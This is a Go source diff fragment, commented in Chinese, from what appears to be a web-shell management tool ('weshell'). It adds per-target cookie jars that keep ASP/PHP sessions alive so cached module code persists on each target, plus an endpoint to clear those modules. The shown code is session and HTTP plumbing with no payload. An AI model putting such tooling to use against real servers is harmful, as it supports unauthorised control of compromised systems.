+func (laxPublicSuffixList) PublicSuffix(string) string { return "" }
+func (laxPublicSuffixList) String() string            { return "lax" }
+
+// jarFor 返回（或懒建）某靶机专用的 cookie 罐。会话模块机制靠它跨请求维持
+// 靶机的 ASPSESSIONID / PHPSESSID，使靶机会话（含已缓存的模块源码）在多次调用间保持。
+// 按靶机 ID 隔离，避免同一主机上不同靶机的会话 cookie 相互串扰。
+//
+// 注意：必须用宽松的公共后缀列表，否则默认列表会拒绝为 localhost / 127.0.0.1 / 纯 IP
+// 这类"无公共后缀"的主机设置 cookie，导致会话无法保持、模块每次都重存（优化失效）。
+func (s *Server) jarFor(id string) http.CookieJar {
+	if v, ok := s.jars.Load(id); ok {
+		return v.(http.CookieJar)
+	}
+	j, err := cookiejar.New(&cookiejar.Options{PublicSuffixList: laxPublicSuffixList{}})
+	if err != nil {
+		// 退化方案：无 cookie 罐时回退默认（localhost/IP 下可能不缓存，但功能仍正常）。
+		j, _ = cookiejar.New(nil)
+	}
+	actual, _ := s.jars.LoadOrStore(id, j)
+	return actual.(http.CookieJar)
+}
+
+// handleClearModules 处理 DELETE /api/targets/modules/{id}：清空靶机会话中缓存的模块源码。
+func (s *Server) handleClearModules(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodDelete {
+		writeJSON(w, http.StatusMethodNotAllowed, newError("只支持 DELETE"))
+		return
+	}
+	id := strings.Trim(strings.TrimPrefix(r.URL.Path, "/api/targets/modules/"), "/")
+	if id == "" || strings.ContainsAny(id, "/\\") {
+		writeJSON(w, http.StatusBadRequest, newError("缺少靶机 ID"))
+		return
+	}
+	t, ok := s.store.Get(id)
+	if !ok {
+		writeJSON(w, http.StatusNotFound, newError("靶标不存在"))
+		return
+	}
+	opts := s.execOpts(t)
+	if err := shell.ClearModules(r.Context(), opts, shell.ForType(opts.Type)); err != nil {
+		writeJSON(w, http.StatusInternalServerError, newError(err.Error()))
+		return
+	}
+	s.jars.Delete(id) // 本地 cookie 罐也一并丢弃
+	writeJSON(w, http.StatusOK, map[string]any{"ok": true})
 }
 
 // apiError 是统一的错误响应体。
@@ -929,7 +1260,7 @@ func writeJSON(w http.ResponseWriter, status int, payload any) {
 	w.Header().Set("Cache-Control", "no-store")
 	w.WriteHeader(status)
 	if err := json.NewEncoder(w).Encode(payload); err != nil {
-		log.Printf("[weshell] 写出 JSON 响应失败: %v", err)
+		logrus.Infof("写出 JSON 响应失败: %v", err)
 	}
 }
 
